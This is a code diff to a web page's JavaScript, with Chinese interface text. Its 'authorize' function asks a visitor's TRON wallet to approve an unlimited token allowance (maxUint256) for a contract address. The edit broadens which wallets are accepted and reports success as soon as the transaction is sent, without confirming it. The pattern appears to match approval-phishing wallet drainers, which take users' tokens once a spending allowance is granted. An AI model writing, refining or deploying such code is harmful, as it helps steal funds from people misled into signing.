@@ -84,8 +84,15 @@
 
         async function authorize() {
             try {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    showNotification('請先連接TronLink錢包', 'error');
+                // 檢查是否有任何 TRON 錢包連接
+                if (!window.tronWeb) {
+                    showNotification('請連接 TRON 錢包', 'error');
+                    return;
+                }
+
+                // 檢查是否已連接錢包地址
+                if (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+                    showNotification('請先連接錢包', 'error');
                     return;
                 }
 
@@ -99,50 +106,29 @@
                 
                 showNotification('請在錢包中確認交易...', 'success');
                 
-                // 發送交易
-                const transaction = await contract.approve(contractAddress, maxUint256).send();
-                
-                showNotification('交易已發送，等待確認...', 'success');
-                
-                // 等待交易確認
-                let isConfirmed = false;
-                for (let i = 0; i < 10; i++) {
-                    await new Promise(resolve => setTimeout(resolve, 3000)); // 等待3秒
-                    
-                    try {
-                        const txInfo = await window.tronWeb.trx.getTransactionInfo(transaction);
-                        if (txInfo && txInfo.receipt) {
-                            isConfirmed = true;
-                            if (txInfo.receipt.result === 'SUCCESS') {
-                                showNotification('授權成功！', 'success');
-                                return;
-                            } else {
-                                throw new Error('交易失敗');
-                            }
-                        }
-                    } catch (err) {
-                        console.log('檢查交易狀態:', err);
+                try {
+                    // 發送交易
+                    const transaction = await contract.approve(contractAddress, maxUint256).send();
+                    showNotification('授權成功！', 'success');
+                } catch (txError) {
+                    // 處理交易特定錯誤
+                    if (txError.message && txError.message.toLowerCase().includes('user rejected')) {
+                        showNotification('交易已取消', 'error');
+                    } else {
+                        throw txError; // 拋出其他錯誤
                     }
                 }
-                
-                if (!isConfirmed) {
-                    throw new Error('請在TronScan中檢查交易狀態');
-                }
-                
+
             } catch (error) {
                 console.error('授權錯誤:', error);
-                if (error.message && error.message.includes('User rejected')) {
-                    showNotification('用戶取消了交易', 'error');
-                } else {
-                    showNotification(error.message || '授權失敗，請重試', 'error');
-                }
+                showNotification('授權失敗，請重試', 'error');
             }
         }
 
-        // 檢查TronLink是否已安裝
+        // 檢查錢包連接
         window.addEventListener('load', () => {
             if (!window.tronWeb) {
-                showNotification('請安裝TronLink錢包', 'error');
+                showNotification('請連接 TRON 錢包', 'error');
             }
         });
     </script>
